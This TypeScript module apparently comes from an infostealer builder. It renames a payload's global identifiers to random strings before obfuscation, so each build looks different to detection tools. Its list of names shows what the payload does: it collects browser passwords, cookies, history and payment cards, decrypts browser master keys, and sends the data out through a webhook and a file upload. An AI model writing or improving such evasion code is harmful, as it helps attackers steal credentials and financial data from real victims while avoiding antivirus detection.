// Generates a random identifier map and rewrites global function/var names in the payload.
// Applied BEFORE obfuscation so js-confuser sees already-renamed names.

const CHARS = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
const CHARS_TAIL = CHARS + '0123456789_';

function randName(min = 8, max = 16): string {
  const len = min + Math.floor(Math.random() * (max - min + 1));
  let s = CHARS[Math.floor(Math.random() * CHARS.length)];
  for (let i = 1; i < len; i++) s += CHARS_TAIL[Math.floor(Math.random() * CHARS_TAIL.length)];
  return s;
}

// All global identifiers in payload.js that we want to rename
const GLOBAL_NAMES = [
  'WEBHOOK', 'TMP', 'RUN_ID', 'CHROMIUM',
  'ps', 'tryPython', 'getSqlite3', 'readDb',
  'masterKeys', 'getMasterKey', 'decryptValue', 'profiles',
  'collectPasswords', 'collectCookies', 'collectHistory', 'collectCards', 'collectFirefox',
  'httpGet', 'getSysInfo', 'uploadTempSh',
  'countryFlag', 'trunc', 'sendWebhook',
  'embedSys', 'embedPasswords', 'embedCookies', 'embedHistory', 'embedCards',
  'fmtPasswords', 'fmtCookies', 'fmtHistory', 'fmtCards',
  'main',
];

export function applyPolymorphicNames(source: string): { code: string; nameMap: Record<string, string> } {
  const used = new Set<string>();
  const nameMap: Record<string, string> = {};

  for (const name of GLOBAL_NAMES) {
    let r: string;
    do { r = randName(); } while (used.has(r));
    used.add(r);
    nameMap[name] = r;
  }

  let code = source;
  // Replace whole-word occurrences only (won't touch substrings)
  for (const [orig, replacement] of Object.entries(nameMap)) {
    const re = new RegExp(`\\b${orig}\\b`, 'g');
    code = code.replace(re, replacement);
  }

  return { code, nameMap };
}
